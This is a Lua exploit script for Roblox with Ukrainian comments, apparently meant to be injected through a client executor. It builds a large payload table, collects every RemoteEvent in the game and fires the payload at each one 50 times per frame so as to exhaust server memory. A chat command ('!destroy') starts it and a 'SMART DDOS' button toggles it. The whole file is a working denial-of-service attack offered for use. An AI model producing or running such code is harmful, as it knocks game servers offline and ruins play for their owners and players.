-- [[ PROJECT DIAMOND X - SERVER DESTROYER ]]
-- Protocol: aidel (deloriq team)

local replicatedStorage = game:GetService("ReplicatedStorage")
local runService = game:GetService("RunService")
local players = game:GetService("Players")

_G.stressing = false

-- Генерація максимально важкого пакета для забиття пам'яті сервера
local function generatePayload()
    local t = {}
    for i = 1, 1000 do
        t[i] = {
            ["CRASH"] = string.rep("💎", 500),
            ["VAL"] = math.random() * 1000000,
            ["BOOL"] = true
        }
    end
    return t
end

local payload = generatePayload()

-- Основна функція атаки
local function initiateAttack()
    print("[aidel]: ATTACK STARTED")
    
    -- Знаходимо всі RemoteEvents в грі
    local remotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            table.insert(remotes, v)
        end
    end

    -- Нескінченний цикл без затримок для максимального PPS (Packets Per Second)
    runService.Heartbeat:Connect(function()
        if _G.stressing then
            for _, remote in pairs(remotes) do
                -- Відправляємо пачки по 50 важких запитів на кожен кадр
                for i = 1, 50 do
                    pcall(function()
                        remote:FireServer(payload)
                    end)
                end
            end
        end
    end)
end

-- Система управління через чат (для твоїх ботів)
game:GetService("LogService").MessageOut:Connect(function(msg)
    if msg:find("!destroy") then
        _G.stressing = true
        initiateAttack()
    elseif msg:find("!stop") then
        _G.stressing = false
    end
end)

-- Функція для твого GUI кнопки
-- В кнопці SMART DDOS просто пропиши:
-- _G.stressing = not _G.stressing; if _G.stressing then initiateAttack() end
